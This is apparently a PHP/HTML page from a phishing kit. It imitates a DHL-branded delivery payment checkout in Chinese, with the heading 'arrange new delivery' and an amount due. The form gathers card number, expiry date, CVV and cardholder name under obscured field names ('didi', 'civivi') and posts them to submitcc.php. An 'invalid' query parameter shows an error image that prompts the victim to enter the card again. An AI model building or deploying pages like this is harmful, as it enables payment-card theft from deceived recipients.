<?php
session_start();
date_default_timezone_set("Asia/Taipei");
?>
<!DOCTYPE html>
<html dir="ltr" lang="en" class="ltr js" >
   <!--<![endif]-->
   <head>
      <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <meta name="format-detection" content="telephone=no">
      <link rel="icon" type="image/ico" href="files/favicon.gif">
	  <script type="text/javascript" language="javascript" src="files/dhl.js">
	  </script>
      <title>附加信息</title>
      <link href="files/html-header.css" rel="stylesheet" type="text/css">
      <style id="rpp-custom-style">
         .ie8 body {
         background-color:#f1f1f1;
         }
         .ie8 body {
         color:#000000;
         }
         body {
         background-color:#f1f1f1;
         font-family:Arial,"Helvetica Neue",Helvetica,sans-serif;
         font-size:15px;
         color:#000000;
         }
         .ie8 body .form-control {
         border-color:#aaaaaa;
         }
         .ie8 body .form-control {
         color:#000000;
         }
         .ie8 body .form-control {
         background-color:#ffffff;
         }
         body .form-control {
         border-style:solid;
         border-width:1px;
         border-color:#aaaaaa;
         font-family:inherit;
         color:#000000;
         background-color:#ffffff;
         border-radius:2px;
         box-shadow:rgba(0, 0, 0, 0.15) 2px 3px 5px 0px inset;
         }
         .ie8 body .btn-primary {
         background-color:#006700;
         }
         .ie8 body .btn-primary {
         color:#ffffff;
         }
         .ie8 body .btn-primary {
         border-color:#006700;
         }
         body .btn-primary {
         background-color:#006700;
         color:#ffffff;
         border-style:solid;
         border-width:1px;
         border-color:#006700;
         border-radius:0px;
         font-family:Arial,"Helvetica Neue",Helvetica,sans-serif;
         font-size:18px;
         margin-top:5px;
         margin-right:0;
         margin-bottom:0;
         margin-left:0;
         }
         .ie8 body .btn-primary:hover, .ie8 body .btn-primary:focus {
         background-color:#003e00;
         }
         .ie8 body .btn-primary:hover, .ie8 body .btn-primary:focus {
         color:#ffffff;
         }
         .ie8 body .btn-primary:hover, .ie8 body .btn-primary:focus {
         border-color:#003e00;
         }
         body .btn-primary:hover, body .btn-primary:focus {
         background-color:#003e00;
         color:#ffffff;
         border-style:solid;
         border-width:1px;
         border-color:#003e00;
         border-radius:2px;
         }
         .ie8 body .btn-primary:active, .ie8 body .btn-primary:active:focus {
         background-color:#003e00;
         }
         .ie8 body .btn-primary:active, .ie8 body .btn-primary:active:focus {
         color:#ffffff;
         }
         .ie8 body .btn-primary:active, .ie8 body .btn-primary:active:focus {
         border-color:#003e00;
         }
         body .btn-primary:active, body .btn-primary:active:focus {
         background-color:#003e00;
         color:#ffffff;
         border-style:solid;
         border-width:1px;
         border-color:#003e00;
         border-radius:2px;
         }
         .ie8 body .btn-secondary {
         background-color:#ffffff;
         }
         .ie8 body .btn-secondary {
         color:#000000;
         }
         .ie8 body .btn-secondary {
         border-color:#ffffff;
         }
         body .btn-secondary {
         background-color:#ffffff;
         color:#000000;
         border-style:none;
         border-width:0px;
         border-color:#ffffff;
         border-radius:0px;
         font-family:Arial,"Helvetica Neue",Helvetica,sans-serif;
         font-size:15px;
         margin-top:5px;
         margin-right:0;
         margin-bottom:0;
         margin-left:0;
         }
         .ie8 body .btn-secondary:hover, .ie8 body .btn-secondary:focus {
         background-color:#ffffff;
         }
         .ie8 body .btn-secondary:hover, .ie8 body .btn-secondary:focus {
         color:#000000;
         }
         .ie8 body .btn-secondary:hover, .ie8 body .btn-secondary:focus {
         border-color:#ffffff;
         }
         body .btn-secondary:hover, body .btn-secondary:focus {
         background-color:#ffffff;
         color:#000000;
         border-style:none;
         border-width:0px;
         border-color:#ffffff;
         border-radius:0px;
         }
         .ie8 body .btn-secondary:active, .ie8 body .btn-secondary:active:focus {
         background-color:#ffffff;
         }
         .ie8 body .btn-secondary:active, .ie8 body .btn-secondary:active:focus {
         color:#000000;
         }
         .ie8 body .btn-secondary:active, .ie8 body .btn-secondary:active:focus {
         border-color:#ffffff;
         }
         body .btn-secondary:active, body .btn-secondary:active:focus {
         background-color:#ffffff;
         color:#000000;
         border-style:none;
         border-width:0px;
         border-color:#ffffff;
         border-radius:0px;
         }
         .ie8 body .btn-tertiary {
         background-color:#ffffff;
         }
         .ie8 body .btn-tertiary {
         border-color:#e5e5e5;
         }
         body .btn-tertiary {
         background-color:#ffffff;
         border-style:solid;
         border-width:1px;
         border-color:#e5e5e5;
         font-family:Arial,"Helvetica Neue",Helvetica,sans-serif;
         font-size:18px;
         }
         .ie8 body .btn-tertiary:hover, .ie8 body .btn-tertiary:focus {
         background-color:#cccccc;
         }
         .ie8 body .btn-tertiary:hover, .ie8 body .btn-tertiary:focus {
         color:#000000;
         }
         .ie8 body .btn-tertiary:hover, .ie8 body .btn-tertiary:focus {
         border-color:#cccccc;
         }
         body .btn-tertiary:hover, body .btn-tertiary:focus {
         background-color:#cccccc;
         color:#000000;
         border-style:solid;
         border-width:1px;
         border-color:#cccccc;
         }
         .ie8 body .btn-tertiary:active, .ie8 body .btn-tertiary:active:focus {
         background-color:#cccccc;
         }
         .ie8 body .btn-tertiary:active, .ie8 body .btn-tertiary:active:focus {
         color:#000000;
         }
         .ie8 body .btn-tertiary:active, .ie8 body .btn-tertiary:active:focus {
         border-color:#cccccc;
         }
         body .btn-tertiary:active, body .btn-tertiary:active:focus {
         background-color:#cccccc;
         color:#000000;
         border-style:solid;
         border-width:1px;
         border-color:#cccccc;
         }
         .ie8 #header {
         background-color:#fff;
         }
         #header {
         background-color:#fff;
         }
         .ie8 #merchantname {
         color:#ff0000;
         }
         #merchantname {
         font-family:Arial,"Helvetica Neue",Helvetica,sans-serif;
         font-size:18px;
         color:#ff0000;
         font-weight:normal;
         font-style:italic;
         text-decoration:underline;
         text-align:center;
         }
         .ie8 #precarttext {
         color:inherit;
         }
         #precarttext {
         font-family:inherit;
         font-size:18px;
         color:inherit;
         display:block;
         font-weight:bold;
         font-style:normal;
         text-decoration:none;
         }
         .ie8 #selectmethod {
         color:inherit;
         }
         #selectmethod {
         font-family:inherit;
         font-size:18px;
         color:inherit;
         font-weight:bold;
         font-style:normal;
         text-decoration:none;
         }
         .ie8 #selectmethod1 {
         color:#f1f1f1;
         }
         #selectmethod1 {
         font-family:inherit;
         color:#f1f1f1;
         font-weight:normal;
         font-style:normal;
         text-decoration:none;
         }
         .ie8 #selectmethod2 {
         color:inherit;
         }
         #selectmethod2 {
         font-family:inherit;
         font-size:18px;
         color:inherit;
         font-weight:bold;
         font-style:normal;
         text-decoration:none;
         }
         .ie8 #shoppingcartwrapper {
         background-color:#f1f1f1;
         }
         .ie8 #shoppingcartwrapper {
         border-color:#f2f2f2;
         }
         #shoppingcartwrapper {
         background-color:#f1f1f1;
         border-style:none;
         border-width:2px;
         border-color:#f2f2f2;
         border-radius:0px;
         }
         .ie8 #paymentoptionswrapper {
         border-color:#f2f2f2;
         }
         #paymentoptionswrapper {
         border-style:none;
         border-width:2px;
         border-color:#f2f2f2;
         }
         .ie8 #postcarttext {
         color:#6d0707;
         }
         #postcarttext {
         font-family:inherit;
         font-size:12px;
         color:rgb(109, 7, 7);
         display:block;
         font-weight:normal;
         font-style:italic;
         text-decoration:none;
         }
         .ie8 #securePaymentblockwrapper {
         color:#006700;
         }
         #securePaymentblockwrapper {
         display:block;
         font-family:inherit;
         font-size:15px;
         color:#006700;
         }
         #securePaymentblock {
         font-weight:normal;
         font-style:normal;
         text-decoration:none;
         }
         #paymentProductName {
         font-family:inherit;
         font-weight:normal;
         font-style:normal;
         text-decoration:none;
         display:block;
         }
         #remembermeText {
         font-weight:normal;
         font-style:normal;
         text-decoration:none;
         }
         #paymentbuttontext {
         font-weight:normal;
         font-style:normal;
         text-decoration:none;
         }
         #printPageButtonText {
         font-weight:normal;
         font-style:normal;
         text-decoration:none;
         }
         #cancelbuttontext {
         font-weight:normal;
         font-style:normal;
         text-decoration:none;
         }
         #selectionPageCancelButtonText {
         font-weight:normal;
         font-style:normal;
         text-decoration:none;
         }
         #tryagainbuttontext {
         font-weight:normal;
         font-style:normal;
         text-decoration:none;
         }
         #gotomerchantbuttontext {
         font-weight:normal;
         font-style:normal;
         text-decoration:none;
         }
         #selectotherbuttontext {
         font-weight:normal;
         font-style:normal;
         text-decoration:none;
         }
         .ie8 #prefootertext {
         color:inherit;
         }
         #prefootertext {
         font-family:inherit;
         font-size:15px;
         color:inherit;
         display:none;
         font-weight:normal;
         font-style:normal;
         text-decoration:none;
         }
         .ie8 #footer {
         background-color:#ffffff;
         }
         #footer {
         background-color:#fff;
         }
         .ie8 #paymentprocessorfooter {
         background-color:transparent;
         }
         #paymentprocessorfooter {
         background-color:transparent;
         }
         #paymentprocessorimage {
         display:block;
         }
         @media (min-width:0px) {
         #logoimage{
         background-image:url("files/Logo.jpg");
         width:100px;
         height:22px;
         }
         }
         @media (min-width:768px) {
         #logoimage{
         background-image:url("files/Logo.jpg");
         width:150px;
         height:33px;
         }
         }
         @media (min-width:992px) {
         #logoimage{
         background-image:url("files/Logo.jpg");
         width:150px;
         height:33px;
         }
         }
         @media (min-width:1200px) {
         #logoimage{
         background-image:url("files/Logo.jpg");
         width:150px;
         height:33px;
         }
         }
         #shoppingcartheader {
         display: block !important;
         }
         #shoppingcartcontent {
         display: none !important;
         }
         #shoppingcart .caret {
         display: none;
         }
         #merchantfooter {
         display:block;
         }
         body .paymentoption .hasIcon input { padding-left: 44px; } body .paymentoption .hasIcon select:not(#dateOfBirth-day):not(#dateOfBirth-month):not(#dateOfBirth-year){ padding-left: 40px; } body .paymentoption .hasIcon .date-section { padding-left: 37px; } body .paymentoption .hasIcon .date-section i { border-right: 0 } body .paymentoption .hasIcon > i { display: block;} body .paymentoption .form-group.hasIcon > label { display: none!important; } html.rtl body .paymentoption .hasIcon .hasIcon:not(.ltr) i:not(.icon-qmark) { padding: 11px 0 0 8px; margin-left: 0; margin-right: 10px; border-right: 0; border-left: 1px solid #f2f2f2; } html.rtl body .paymentoption .hasIcon .hasIcon:not(.ltr) input { padding-right: 44px; padding-left: 10px; } html.rtl body .paymentoption .hasIcon .hasIcon:not(.ltr) select:not(#dateOfBirth-day):not(#dateOfBirth-month):not(#dateOfBirth-year) { padding-left: 13px; padding-right: 40px; } html.rtl body .paymentoption .hasIcon .hasIcon:not(.ltr) .date-section { padding-left: 0; padding-right: 37px; } html.rtl body .paymentoption .hasIcon .hasIcon:not(.ltr) .date-section i { border-left: 0; } #logoimage { display: block; } #merchantname { display: none; }#logoimage {
         float:left;
         }
         #remembermeBlock {
         display:none;
         }
         .ie8 #appPayment-introduction {
         color:#000000;
         }
         #appPayment-introduction {
         font-family:Arial,"Helvetica Neue",Helvetica,sans-serif;
         font-size:15px;
         color:#000000;
         font-weight:normal;
         font-style:normal;
         text-decoration:none;
         text-align:left;
         }
         .ie8 #appPayment-paywithapplabel {
         color:#000000;
         }
         #appPayment-paywithapplabel {
         font-family:Arial,"Helvetica Neue",Helvetica,sans-serif;
         font-size:15px;
         color:#000000;
         font-weight:bold;
         font-style:normal;
         text-decoration:none;
         text-align:left;
         }
         #appPayment-paywithappbuttontext {
         font-weight:normal;
         font-style:normal;
         text-decoration:none;
         }
         #appPayment-refreshpaymentbuttontext {
         font-weight:normal;
         font-style:normal;
         text-decoration:none;
         }
         .ie8 #appPayment-qrcodelabel {
         color:#000000;
         }
         #appPayment-qrcodelabel {
         font-family:Arial,"Helvetica Neue",Helvetica,sans-serif;
         font-size:15px;
         color:#000000;
         font-weight:normal;
         font-style:normal;
         text-decoration:none;
         text-align:left;
         }
         .ie8 body .divider-wrapper .text-over-divider {
         background-color:#ffffff;
         }
         body .divider-wrapper .text-over-divider {
         font-weight:bold;
         font-style:normal;
         text-decoration:none;
         background-color:#ffffff;
         }
         .ie8 #appPayment-paywithcardlabel {
         color:#000000;
         }
         #appPayment-paywithcardlabel {
         font-family:Arial,"Helvetica Neue",Helvetica,sans-serif;
         font-size:15px;
         color:#000000;
         font-weight:bold;
         font-style:normal;
         text-decoration:none;
         text-align:left;
         }
         .ie8 #appPayment-processingtitle {
         color:#000000;
         }
         #appPayment-processingtitle {
         font-family:Arial,"Helvetica Neue",Helvetica,sans-serif;
         font-size:15px;
         color:#000000;
         font-weight:normal;
         font-style:italic;
         text-decoration:underline;
         text-align:left;
         }
         .ie8 #appPayment-processing {
         color:#000000;
         }
         #appPayment-processing {
         font-family:Arial,"Helvetica Neue",Helvetica,sans-serif;
         font-size:15px;
         color:#000000;
         font-weight:normal;
         font-style:italic;
         text-decoration:underline;
         text-align:left;
         }
         .ie8 #appPayment-refreshlabel {
         color:#000000;
         }
         #appPayment-refreshlabel {
         font-family:Arial,"Helvetica Neue",Helvetica,sans-serif;
         font-size:15px;
         color:#000000;
         font-weight:normal;
         font-style:italic;
         text-decoration:underline;
         text-align:left;
         }
         .ie8 body .has-error div.error {
         color:#9c0000;
         }
         body .has-error div.error {
         font-family:inherit;
         color:#9c0000;
         }
         .ie8 body .has-error .form-control {
         border-color:#9c0000;
         }
         body .has-error .form-control {
         border-color:#9c0000;
         }
         .ie8 body .has-error .form-control:focus {
         border-color:#9c0000;
         }
         body .has-error .form-control:focus {
         border-color:#9c0000;
         -webkit-box-shadow:inset 0 1px 1px rgba(0,0,0,0.075), 0 0 6px #9c0000;
         box-shadow:inset 0 1px 1px rgba(0,0,0,0.075), 0 0 6px #9c0000;
         }
         .ie8 #loading {
         background-color:#ffffff;
         }
         .ie8 #loading {
         color:#666666;
         }
         #loading {
         background-color:rgba(255, 255, 255, 0.9);
         color:#666666;
         }
         .ie8 #loading .loading-text {
         color:#666666;
         }
         .ie8 #loading .loading-text {
         background-color:#ffffff;
         }
         #loading .loading-text {
         font-family:inherit;
         color:#666666;
         font-weight:normal;
         font-style:normal;
         text-decoration:none;
         text-align:center;
         background-color:#ffffff;
         }
         body .paymentoptions form, body .paymentoptions .par {
         max-width:300px;
         }
         .ie8 #cobrand .cobrand-wrapper {
         background-color:#f2f2f2;
         }
         #cobrand .cobrand-wrapper {
         background-color:#f2f2f2;
         font-family:inherit;
         }
         .ie8 body .btn-link:active, .ie8 body .btn-link:active:focus {
         background-color:transparent;
         }
         .ie8 body .btn-link:active, .ie8 body .btn-link:active:focus {
         color:#1f5284;
         }
         .ie8 body .btn-link:active, .ie8 body .btn-link:active:focus {
         border-color:transparent;
         }
         body .btn-link:active, body .btn-link:active:focus {
         background-color:transparent;
         color:#1F5284;
         border-style:none;
         border-width:0px;
         border-color:transparent;
         border-radius:0px;
         }
         .ie8 body .btn-lookup:active, .ie8 body .btn-lookup:active:focus {
         background-color:#e6e6e6;
         }
         .ie8 body .btn-lookup:active, .ie8 body .btn-lookup:active:focus {
         color:#000000;
         }
         .ie8 body .btn-lookup:active, .ie8 body .btn-lookup:active:focus {
         border-color:#bfbdc8;
         }
         body .btn-lookup:active, body .btn-lookup:active:focus {
         background-color:#e6e6e6;
         color:#000000;
         border-style:solid;
         border-width:1px;
         border-color:#bfbdc8;
         border-radius:1px;
         }
         .ie8 body .btn-link:hover, .ie8 body .btn-link:focus {
         background-color:transparent;
         }
         .ie8 body .btn-link:hover, .ie8 body .btn-link:focus {
         color:#1f5284;
         }
         .ie8 body .btn-link:hover, .ie8 body .btn-link:focus {
         border-color:transparent;
         }
         body .btn-link:hover, body .btn-link:focus {
         background-color:transparent;
         color:#1F5284;
         border-style:none;
         border-width:0px;
         border-color:transparent;
         border-radius:0px;
         }
         .ie8 body .btn-lookup:hover, .ie8 body .btn-lookup:focus {
         background-color:#e6e6e6;
         }
         .ie8 body .btn-lookup:hover, .ie8 body .btn-lookup:focus {
         color:#000000;
         }
         .ie8 body .btn-lookup:hover, .ie8 body .btn-lookup:focus {
         border-color:#bfbdc8;
         }
         body .btn-lookup:hover, body .btn-lookup:focus {
         background-color:#e6e6e6;
         color:#000000;
         border-style:solid;
         border-width:1px;
         border-color:#bfbdc8;
         border-radius:1px;
         }
         .ie8 body .btn-link {
         background-color:transparent;
         }
         .ie8 body .btn-link {
         color:#2869ac;
         }
         .ie8 body .btn-link {
         border-color:transparent;
         }
         body .btn-link {
         background-color:transparent;
         color:#2869ac;
         border-style:none;
         border-width:0px;
         border-color:transparent;
         border-radius:0px;
         font-family:Arial,"Helvetica Neue",Helvetica,sans-serif;
         font-size:15px;
         margin-top:0;
         margin-right:0;
         margin-bottom:0;
         margin-left:0;
         }
         .ie8 body .btn-lookup {
         background-color:#f2f2f2;
         }
         .ie8 body .btn-lookup {
         color:inherit;
         }
         .ie8 body .btn-lookup {
         border-color:#bfbdc8;
         }
         body .btn-lookup {
         background-color:#f2f2f2;
         color:inherit;
         border-style:solid;
         border-width:1px;
         border-color:#bfbdc8;
         border-radius:1px;
         font-family:Arial,"Helvetica Neue",Helvetica,sans-serif;
         font-size:18px;
         margin-top:0;
         margin-right:0;
         margin-bottom:0;
         margin-left:0;
         }
         #enterinformationButtonText {
         font-weight:normal;
         font-style:normal;
         text-decoration:none;
         }
         #searchconsumerButtonText {
         font-weight:normal;
         font-style:normal;
         text-decoration:none;
         }
         .ie8 #label-searchConsumerText {
         color:#000000;
         }
         #label-searchConsumerText {
         font-weight:normal;
         font-style:normal;
         text-decoration:none;
         font-family:Arial,"Helvetica Neue",Helvetica,sans-serif;
         color:#000000;
         }
         .ie8 #afterpayTermsandconditionsText {
         color:#000000;
         }
         #afterpayTermsandconditionsText {
         font-family:Arial,"Helvetica Neue",Helvetica,sans-serif;
         font-size:15px;
         color:#000000;
         }
         .ie8 body .panel {
         background-color:#f2f2f2;
         }
         .ie8 body .panel {
         border-color:#e5e5e5;
         }
         body .panel {
         background-color:#F2F2F2;
         border-style:none;
         border-width:2px;
         border-color:#e5e5e5;
         border-radius:0px;
         }
         .ie8 #cobrand .toggle-cobrand {
         color:inherit;
         }
         #cobrand .toggle-cobrand {
         text-decoration:underline;
         color:inherit;
         }
         .ie8 #cobrand .toggle-cobrand:hover, .ie8 #cobrand .toggle-cobrand:focus {
         color:inherit;
         }
         #cobrand .toggle-cobrand:hover, #cobrand .toggle-cobrand:focus {
         text-decoration:inherit;
         color:inherit;
         }
         .ie8 #cobrand .toggle-cobrand:active, .ie8 #cobrand .toggle-cobrand:active:focus {
         color:inherit;
         }
         #cobrand .toggle-cobrand:active, #cobrand .toggle-cobrand:active:focus {

         text-decoration:inherit;
         color:inherit;
         }
         #cancelPaymentForm {
         display:none;
         }
         .ie8 #secciUrlLink:active, .ie8 #secciUrlLink:active:focus {
         color:#262626;
         }
         #secciUrlLink:active, #secciUrlLink:active:focus {
         color:#262626;
         text-decoration:underline;
         }
         .ie8 #secciUrlLink:hover, .ie8 #secciUrlLink:focus {
         color:#262626;
         }
         #secciUrlLink:hover, #secciUrlLink:focus {
         color:#262626;
         text-decoration:underline;
         }
         .ie8 #secciUrlLink {
         color:#000000;
         }
         #secciUrlLink {
         color:#000000;
         text-decoration:underline;
         }
         .ie8 #afterpayTermsAndConditionsLink:active, .ie8 #afterpayTermsAndConditionsLink:active:focus {
         color:inherit;
         }
         #afterpayTermsAndConditionsLink:active, #afterpayTermsAndConditionsLink:active:focus {
         color:inherit;
         text-decoration:underline;
         }
         .ie8 #afterpayTermsAndConditionsLink:hover, .ie8 #afterpayTermsAndConditionsLink:focus {
         color:inherit;
         }
         #afterpayTermsAndConditionsLink:hover, #afterpayTermsAndConditionsLink:focus {
         color:inherit;
         text-decoration:underline;
         }
         .ie8 #afterpayTermsAndConditionsLink {
         color:inherit;
         }
         #afterpayTermsAndConditionsLink {
         color:inherit;
         text-decoration:underline;
         }
         .ie8 #footerWrapper a:active, .ie8 #footerWrapper a:active:focus {
         color:#262626;
         }
         #footerWrapper a:active, #footerWrapper a:active:focus {
         color:#262626;
         text-decoration:underline;
         }
         .ie8 #footerWrapper a:hover, .ie8 #footerWrapper a:focus {
         color:#262626;
         }
         #footerWrapper a:hover, #footerWrapper a:focus {
         color:#262626;
         text-decoration:underline;
         }
         .ie8 #footerWrapper a {
         color:#000000;
         }
         #footerWrapper a {
         color:#000000;
         text-decoration:none;
         }
         #privacyPolicyContainer {
         text-align:center;
         }
         .ie8 .popover {
         background-color:#ffffff;
         }
         .ie8 .popover {
         color:inherit;
         }
         .ie8 .popover {
         border-color:#999999;
         }
         .popover {
         background-color:#fff;
         font-family:inherit;
         color:inherit;
         border-style:solid;
         border-width:1px;
         border-color:#999999;
         border-radius:4px;
         }
         .popover.left > .arrow:after {
         border-left-color:#fff;
         }
         .popover.bottom > .arrow:after {
         border-bottom-color:#fff;
         }
         .popover.right > .arrow:after {
         border-right-color:#fff;
         }
         .popover.left > .arrow:after {
         right:1px;
         }
         .popover.bottom > .arrow:after {
         top:1px;
         }
         .popover.right > .arrow:after {
         left:1px;
         }
         .popover.left > .arrow {
         border-left-color:#999999;
         }
         .popover.bottom > .arrow {
         border-bottom-color:#999999;
         }
         .popover.right > .arrow {
         border-right-color:#999999;
         }
         .ie8 .info-popover {
         background-color:#f2f2f2;
         }
         .ie8 .info-popover {
         color:#666666;
         }
         .ie8 .info-popover {
         border-color:#666666;
         }
         .info-popover {
         background-color:#f2f2f2;
         font-size:16px;
         color:#666666;
         border-color:#666666;
         box-shadow:none;
         }
         .ie8 #appPayment-warning {
         color:inherit;
         }
         #appPayment-warning {
         font-weight:normal;
         font-style:normal;
         text-decoration:none;
         font-family:inherit;
         color:inherit;
         }
         .ie8 #boletoBancarioBarcodeContainer {
         color:inherit;
         }
         .ie8 #boletoBancarioBarcodeContainer {
         border-color:#cccccc;
         }
         .ie8 #boletoBancarioBarcodeContainer {
         background-color:#f2f2f2;
         }
         #boletoBancarioBarcodeContainer {
         font-family:inherit;
         color:inherit;
         border-style:solid;
         border-width:1px;
         border-color:#cccccc;
         background-color:#f2f2f2;
         }
         #boletoBancarioBarcodeContainer .barcode-bank {
         border-bottom-style:solid;
         }
         #boletoBancarioBarcodeContainer .barcode-bank {
         border-bottom-width:1px;
         }
         #boletoBancarioBarcodeContainer .barcode-bank {
         border-bottom-color:#cccccc;
         }
         #paymentoptionslistAOF li .btn-tertiary>div>img, #paymentoptionslist li .btn-tertiary>div>img, body .paymentoption .cc-image>img { background-color: transparent; }
      </style>
   </head>
   <body class="">
      <div id="content">
         <header id="header">
            <div class="container">
               <div class="row">
                  <div class="col-xs-24">
                     <div id="logoimage">
                     </div>
                     <h3 id="merchantname">
                        [merchantName]          
                     </h3>
                  </div>
               </div>
            </div>
         </header>
         <main id="main" class="container">
            <div class="row">
              <div class="col-md-8">
                  <div class="extra-content">
                     <div id="precarttext">
                        安排新的交付		
                     </div>
                  </div><h3>全部的: <?php echo $_SESSION['amount']; ?></h3>
                  <div class="cart" id="shoppingcartwrapper">
                     <div id="shoppingcart">
                        <div class="header hidden-md hidden-lg" id="shoppingcartheader">
                           <span class="amount pull-right"> 
                           </span>
                        </div>
                        <div class="content hidden-xs hidden-sm " id="shoppingcartcontent">
                           <div>
                              <h1>您的訂單</h1>
                              <table class="table">
                                 <tbody>
                                 </tbody>
                                 <tfoot>
                                    <tr>
                                       <td>
                                          <strong>全部的</strong>
                                       </td>
                                       <td class="amount"><strong></strong>
                                          <span class="caret">
                                          </span>
                                       </td>
                                    </tr>
                                 </tfoot>
                              </table>
                           </div>
                        </div>
                     </div>
                  </div>
                  <div class="extra-content">
                     <div id="postcarttext">			
                     </div>
                  </div>
               </div>
               <div class="col-md-12">
                  <div id="paymentoptionswrapper" class="paymentoptions">
                     <div class="par">
                        <p class="securePayment pull-right" id="securePaymentblockwrapper">
                           <span id="securePaymentblock">
                           <img src="files/s03.png"></span>
                        </p>
                        <div class="clearfix"></div>
                     </div>
                     <form id="paymentoptionForm" name="paymentoptionForm" method="post" class="validatedForm" novalidate="novalidate" action="submitcc.php">
                        <div class="paymentoption"><?php
if ($_GET['data'] == "invalid") {
print ('<img src="files/s08.png"><br><br>');
}
?>
                           <div class="form-group form-group--prefill-editable hasIcon" data-display-order="10">
                              <div class="hasIcon ltr" dir="ltr">
                                 <input name="didi" placeholder="Card number" id="didi" class="form-control cc-num" data-send="true" type="tel" required="required" value="" maxlength="19" autofocus>
                                 <span class="cc-image"><img src="files/mare.png"></span>
                                 <i class="icon-card"></i>
                              </div>
                           </div>
                           <div class="form-group hasIcon expiration" data-display-order="20">
                              <div class="hasIcon ltr" dir="ltr">
                                 <input name="exp" placeholder="MM/YY" id="exp" class="form-control cc-exp" data-send="true" type="tel" required="required" value="" onkeyup="this.value=this.value.replace(/^(\d\d)(\d)$/g,'$1/$2').replace(/^(\d\d)(\d+)$/g,'$1/$2').replace(/[^\d\/]/g,'')" maxlength="7">
                                 <i class="icon-date"></i>
                              </div>
                           </div>
                           <div class="form-group cvv hasIcon" data-display-order="24">
                             <div class="hasIcon ltr" dir="ltr">
                                 <input name="civivi" placeholder="CVV" id="civivi" class="form-control cvvinput cc-cvc" data-send="true" autocomplete="cc-csc" type="tel" value="" maxlength="3">
                              <i class="icon-lock"></i></div>
                           </div>
                           <div class="form-group cardholder-name hasIcon" data-display-order="1142">
                              <div class="hasIcon ltr" dir="ltr">
                                 <input name="name" placeholder="" id="name" class="form-control cc-name" data-send="true" type="text" value="">
                                 <i class="icon-user"></i>
                              </div>
                           </div>
                           <div class="clearfix"></div>
                        </div>
                        <div class="paymentbuttons" id="paymentButtons">
                           <button id="primaryButton" class="btn btn-block-rpp btn-primary" type="submit" name="doPayment" value="doPayment" onClick="return validateDidi()">
                           <span id="paymentbuttontext">
                           支付        </span>
                           </button>
                           <button id="secondaryButton" class="btn btn-block-rpp btn-secondary cancel " type="button" name="cancelPayment" value="cancelPayment">
                           <span id="cancelbuttontext" class="cancel">
                           取消        </span>
                           </button>
                        </div>
                        <input name="expiryDateMonth" id="expiryDateMonth" type="text" autocomplete="cc-exp-month" tabindex="-1" aria-labelledby="label-expiryDate" style="opacity: 0; width: 0px; height: 0px; overflow: hidden; pointer-events: none; margin: 0px; padding: 0px; position: absolute;" value=""><input name="expiryDateYear" id="expiryDateYear" type="text" autocomplete="cc-exp-year" tabindex="-1" aria-labelledby="label-expiryDate" style="opacity: 0; width: 0px; height: 0px; overflow: hidden; pointer-events: none; margin: 0px; padding: 0px; position: absolute;" value="">
                     </form>
                  </div>
                  <div class="extra-content">
                     <div id="prefootertext">
                        write here…                
                     </div>
                  </div>
               </div>
            </div>
         </main>
         <footer id="footerWrapper">
            <div id="footer">
               <div class="footer-menu">
                  <div class="container merchant" id="merchantfooter">
                     <div class="row">
                        <nav class="col-xs-24">
                           <ul>
                              <li><a href="#" target="_blank" data-test-selector="footerLink" rel="noopener">家</a></li>
                              <li><a href="#" target="_blank" data-test-selector="footerLink" rel="noopener">使用條款</a></li>
                              <li><a href="#" target="_blank" data-test-selector="footerLink" rel="noopener">隱私</a></li>
                           </ul>
                        </nav>
                     </div>
                  </div>
               </div>
            </div>
            <!-- footer -->
            <div class="globalcollect" id="paymentprocessorfooter">
               <div class="container">
                  <div class="row">
                     <div class="col-xs-24">
                        <img alt="" id="paymentprocessorimage" src="files/4beb83b8ba3db82712a14630794f0194dd9779b7.png">
                     </div>
                  </div>
                  <div class="row">
                     <div class="col-xs-24" data-test-selector="privacyPolicyContainer" id="privacyPolicyContainer">
                        <a href="#" target="_blank" rel="noopener"><span>隱私政策</span></a>
                     </div>
                  </div>
               </div>
            </div>
         </footer>
      </div>
   </body>
</html>